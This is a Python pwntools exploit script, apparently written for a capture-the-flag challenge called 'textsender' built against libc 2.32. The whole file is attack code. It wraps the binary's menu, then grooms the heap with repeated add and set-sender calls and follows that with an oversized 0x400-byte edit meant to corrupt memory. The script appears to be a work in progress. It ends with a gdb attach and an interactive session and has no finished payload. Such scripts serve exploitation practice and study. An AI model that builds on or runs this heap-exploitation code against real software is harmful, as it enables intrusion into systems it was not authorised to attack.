#!/usr/bin/env python3

from pwn import *

exe = ELF("textsender_patched")
libc = ELF("libc-2.32.so")
ld = ELF("ld-2.32.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process("./textsender_patched")
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()
sla = lambda a,b : r.sendlineafter(f"{a}".encode('utf-8'), f"{b}".encode('utf-8'))
sbla = lambda a,b : r.sendlineafter(a, b)
ru = lambda a : r.recvuntil(f"{a}".encode('utf-8'))
rbsu = lambda a : r.recvuntil(a)
g = lambda : gdb.attach(r)
g_script = lambda script: gdb.attach(r, gdbscript=script)

SET   = 1
ADD   = 2
EDIT  = 3
PRINT = 4
SEND  = 5
EXIT  = 6

def set_sender(payload):
    sla('>', SET)
    sla(':', payload)

def add_message(recipent, message):
    sla('>', ADD)
    sbla(':', recipent)
    sbla(':', message)

def edit_message(name, new_message=''):
    sla('>', EDIT)
    sla(':', name)
    if new_message:
        sla(':', name)

def print_messages():
    sla('>', PRINT)

def send_messages():
    sla('>', SEND)


def main():
    add_message(p64(0)*15, b'C'*0x8)
    set_sender('B'*0x20)
    add_message(p64(0)*15, b'C'*0x8)
    set_sender('B'*0x20)
    add_message(p64(0)*15, b'C'*0x8)
    set_sender('B'*0x20)
    add_message(p64(0)*15, b'C'*0x8)
    set_sender('B'*0x20)
    add_message(p64(0)*15, b'C'*0x8)
    set_sender('B'*0x20)
    add_message(p64(0)*15, b'C'*0x8)
    set_sender('B'*0x20)
    add_message(p64(0)*15, b'C'*0x8)
    set_sender('B'*0x20)
    send_messages()
    edit_message('A'*0x400)
   # add_message(b"Sender: ", b'A'*0x8)
    g()
    #send_messages()
    

    r.interactive()


if __name__ == "__main__":
    main()
